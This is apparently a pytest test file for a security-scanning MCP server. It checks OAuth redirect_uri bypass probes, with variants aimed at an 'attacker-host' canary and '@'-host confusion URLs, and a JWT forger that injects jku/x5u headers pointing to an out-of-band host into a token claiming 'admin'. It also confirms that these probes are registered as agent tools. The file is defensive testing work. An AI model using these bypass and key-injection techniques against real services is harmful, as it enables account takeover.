"""OAuth redirect_uri bypass chain + JWT jku/x5u key-injection probe."""

import base64
import json

import pytest

from moonmcp import server as srv
from moonmcp.web import jwt as jwtmod
from moonmcp.web import oauth as oauthmod


# -- OAuth redirect_uri bypass (pure + fake client) -------------------------
def test_redirect_uri_variants_and_landing():
    variants = dict(oauthmod.redirect_uri_variants("app.example.com"))
    assert "attacker-host" in variants and oauthmod._OAUTH_CANARY in variants["attacker-host"]
    assert any("@" in v for v in variants.values())          # @-host confusion
    # landing detection understands @-host and subdomain forms
    assert oauthmod._lands_on_canary(f"https://app.example.com@{oauthmod._OAUTH_CANARY}/cb?code=x")
    assert oauthmod._lands_on_canary(f"https://{oauthmod._OAUTH_CANARY}/cb")
    assert not oauthmod._lands_on_canary("https://app.example.com/cb?code=x")


class _R:
    def __init__(self, status, location=None):
        self.status = status
        self._loc = location
        self.body = b""

    def header(self, name, default=None):
        return self._loc or default if name.lower() == "location" else default


class _VulnAuthEndpoint:
    """3xx-redirects to whatever redirect_uri it's given (open allow-list)."""

    async def fetch(self, url, **kwargs):
        from urllib.parse import parse_qs, urlsplit
        ruri = parse_qs(urlsplit(url).query).get("redirect_uri", [""])[0]
        return _R(302, location=f"{ruri}?code=SECRET" if ruri else None)


class _SecureAuthEndpoint:
    async def fetch(self, url, **kwargs):
        return _R(400)   # rejects unknown redirect_uri


@pytest.mark.asyncio
async def test_redirect_uri_bypass_flags_open_allowlist():
    res = await oauthmod.probe_redirect_uri_bypass(
        _VulnAuthEndpoint(), "https://auth.example.com/authorize", client_id="webapp")
    assert res and all(f["kind"] == "oauth_redirect_bypass" and f["severity"] == "high" for f in res)


@pytest.mark.asyncio
async def test_redirect_uri_bypass_silent_on_secure():
    res = await oauthmod.probe_redirect_uri_bypass(
        _SecureAuthEndpoint(), "https://auth.example.com/authorize")
    assert res == []


# -- JWT jku/x5u forge (pure) -----------------------------------------------
def _jwt(header, payload):
    def seg(o):
        return base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")
    return f"{seg(header)}.{seg(payload)}.originalsig"


def test_forge_remote_key_header_injects_jku_and_keeps_payload():
    tok = _jwt({"alg": "RS256", "kid": "1"}, {"sub": "admin"})
    forged = jwtmod.forge_remote_key_header(tok, "http://oast.canary/k.json", param="jku")
    h = json.loads(base64.urlsafe_b64decode(forged.split(".")[0] + "=="))
    assert h["jku"] == "http://oast.canary/k.json" and h["alg"] == "RS256"
    # the original payload segment is preserved verbatim
    assert forged.split(".")[1] == tok.split(".")[1]
    # x5u variant + a non-JWT input
    assert "x5u" in json.loads(base64.urlsafe_b64decode(
        jwtmod.forge_remote_key_header(tok, "http://c/x", param="x5u").split(".")[0] + "=="))
    with pytest.raises(ValueError):
        jwtmod.forge_remote_key_header("notajwt", "http://c/x")


# -- registration -----------------------------------------------------------
@pytest.mark.asyncio
async def test_ato_tools_registered():
    tools = {t.name for t in await srv.mcp.list_tools()}
    assert {"oauth_redirect_probe", "jwt_jku_probe"} <= tools
